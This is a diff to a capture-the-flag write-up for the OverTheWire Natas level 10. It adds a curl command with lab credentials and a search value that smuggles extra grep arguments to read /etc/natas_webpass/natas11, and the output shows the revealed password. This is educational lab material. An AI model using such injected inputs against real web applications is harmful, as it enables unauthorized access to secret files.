@@ -106,6 +106,21 @@ if($key != "") {
 </body>
 </html>
 ```
+```bash
+┌──(amro㉿amro)-[~]
+└─$ curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu natas10.natas.labs.overthewire.org --data "needle=. /etc/natas_webpass/natas11 #&submit=submit" |html2text 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1179  100  1128  100    51   4918    222 --:--:-- --:--:-- --:--:--  5126
+****** natas10 ******
+For security reasons, we now filter on certain characters
+
+Find words containing:[needle              ][Search]
+
+Output:
+UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+View sourcecode
+```
 ___
 
 ## 💡 Theory
